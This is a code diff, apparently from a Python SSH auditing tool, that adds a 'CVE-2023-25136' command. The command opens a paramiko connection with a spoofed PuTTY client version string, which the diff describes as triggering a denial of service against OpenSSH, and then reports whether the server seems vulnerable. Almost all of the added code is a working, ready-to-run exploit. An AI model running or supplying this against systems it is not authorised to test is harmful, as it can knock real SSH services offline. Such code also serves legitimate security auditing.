@@ -71,6 +71,18 @@ def check_privatekey(args: argparse.Namespace) -> bool:
     return True
 
 
+def perform_cve_2023_25136(args: argparse.Namespace) -> bool:
+    transport = paramiko.Transport(f"{args.host}:{args.port}")
+    transport.local_version = f"SSH-2.0-{args.client_id}"
+    try:
+        transport.connect(username='', password='')
+    except paramiko.ssh_exception.AuthenticationException:
+        return False
+    except Exception:  # pylint: disable=broad-exception-caught
+        pass
+    return True
+
+
 def init_audit_parser(parser: ModuleParser) -> None:
     subparsers = parser.add_subparsers(title='Available commands', dest="audit_subparser_name", metavar='audit-command')
     subparsers.required = True
@@ -98,6 +110,13 @@ def init_audit_parser(parser: ModuleParser) -> None:
     parser_scan_auth.add_argument('--host', type=str, required=True, help='Hostname or IP address')
     parser_scan_auth.add_argument('--port', type=int, default=22, help='port (default: 22)')
 
+    parser_scan_auth = subparsers.add_parser(
+        'CVE-2023-25136', help='performs a DoS against OpenSSH, which exploirts CVE-2023-25136'
+    )
+    parser_scan_auth.add_argument('--host', type=str, required=True, help='Hostname or IP address')
+    parser_scan_auth.add_argument('--port', type=int, default=22, help='port (default: 22)')
+    parser_scan_auth.add_argument('--client-id', dest='client_id', default='PuTTY_Release_0.64', help='client id string, which triggers the exploit')
+
 
 def run_audit(args: argparse.Namespace) -> None:
     if args.audit_subparser_name == 'check-publickey':
@@ -110,3 +129,8 @@ def run_audit(args: argparse.Namespace) -> None:
         auth_methods = Authenticator.get_auth_methods(args.host, args.port)
         if auth_methods:
             print(",".join(auth_methods))
+    elif args.audit_subparser_name == 'CVE-2023-25136':
+        if not perform_cve_2023_25136(args):
+            print("ERROR - failed to execute the exploit")
+            sys.exit(1)
+        print("OK -> server seems vulnerable")
